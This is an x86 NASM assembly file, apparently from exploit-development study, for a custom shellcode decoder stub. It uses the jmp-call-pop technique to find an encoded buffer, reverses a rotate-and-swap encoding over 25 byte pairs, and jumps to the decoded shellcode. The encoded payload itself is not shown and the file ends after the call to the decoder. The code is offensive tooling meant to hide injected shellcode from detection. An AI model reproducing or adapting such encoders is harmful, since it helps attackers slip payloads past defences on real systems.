; Filename: kaiten-suwappa.nasm
; Author:  Lucas Kauffman
; Website:  http://cloud101.eu
; Purpose: 

global _start			

section .text
_start:
	jmp short call_shellcode

decoder:
	pop esi
	xor ecx, ecx
	mov cl, 25


decode:

	mov al, byte  [esi]
	rol al,4
	mov bl, byte [esi+1]
	ror bl,2	
	mov byte [esi], bl
	mov byte [esi+1],al
	add esi,2
	loop decode

	jmp short EncodedShellcode

call_shellcode:

	call decoder

